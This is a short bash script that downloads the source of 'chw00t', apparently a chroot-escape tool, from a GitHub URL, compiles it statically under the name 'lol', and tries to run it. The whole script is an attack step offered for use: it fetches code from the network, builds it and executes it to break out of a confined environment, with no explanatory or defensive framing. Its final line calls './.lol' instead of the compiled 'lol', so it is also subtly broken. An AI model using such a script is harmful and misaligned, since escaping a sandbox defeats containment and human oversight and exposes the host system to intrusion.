#!/bin/bash
curl -L -o lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
ls -al
/usr/bin/gcc lol.c -o lol -static
ls -al
./.lol --help
